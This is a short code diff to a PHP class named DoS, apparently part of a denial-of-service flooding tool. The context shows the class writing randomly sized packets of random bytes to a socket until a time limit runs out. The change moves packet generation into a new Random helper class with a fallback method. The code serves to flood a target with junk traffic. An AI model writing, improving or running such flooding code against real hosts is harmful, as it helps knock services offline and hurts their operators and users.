@@ -91,7 +91,7 @@ class DoS
 
         // generate random packet
         $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
-        $packet = openssl_random_pseudo_bytes($length);
+        $packet = Random::string($length);
 
         // write packets to stream
         $endTime = time() + $this->time;
@@ -101,6 +101,24 @@ class DoS
 
         // close socket connection
         @fclose($socket);
+    }
+}
+
+class Random
+{
+    /**
+     * Creates a random string whose length is the number of characters specified.
+     * @param $length int length of the random string
+     * @return string the random string
+     */
+    public static function string($length)
+    {
+        // openssl_random_pseudo_bytes is the fastest way to generate a random string
+        if (function_exists("openssl_random_pseudo_bytes")) {
+            return bin2hex(openssl_random_pseudo_bytes($length / 2));
+        } else {
+            return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
+        }
     }
 }
 
